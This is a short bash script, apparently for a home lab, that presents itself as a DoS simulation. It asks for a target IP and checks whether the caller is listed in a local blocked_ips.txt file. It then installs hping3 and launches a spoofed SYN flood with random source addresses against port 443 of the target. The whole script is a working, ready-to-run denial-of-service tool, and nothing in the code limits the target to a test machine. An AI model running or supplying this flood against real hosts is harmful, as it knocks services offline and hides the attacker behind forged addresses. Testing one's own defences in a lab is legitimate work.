#!/bin/bash
echo "💣 Simulate DoS Attack (hping3 with random IPs)"

read -rp "Enter target IP (e.g. 192.168.0.19): " TARGET
TARGET=${TARGET:-192.168.0.19}
BLOCKED_LIST="$HOME/Downloads/blocked_ips.txt"

# Get attacker's current IP
ATTACKER_IP=$(hostname -I | awk '{print $1}')

if [ -f "$BLOCKED_LIST" ] && grep -q "$ATTACKER_IP" "$BLOCKED_LIST"; then
  echo "❌ Your IP ($ATTACKER_IP) is already blocked. Exiting."
  exit 1
fi

echo "📦 Installing hping3 if not present..."
sudo apt-get update && sudo apt-get install -y hping3

echo "🚀 Launching spoofed SYN flood to $TARGET:443..."
echo "⏳ Press Ctrl+C to stop."

# Use random source IPs to simulate multiple attackers
sudo hping3 "$TARGET" -q -n -d 120 -S -p 443 --flood --rand-source
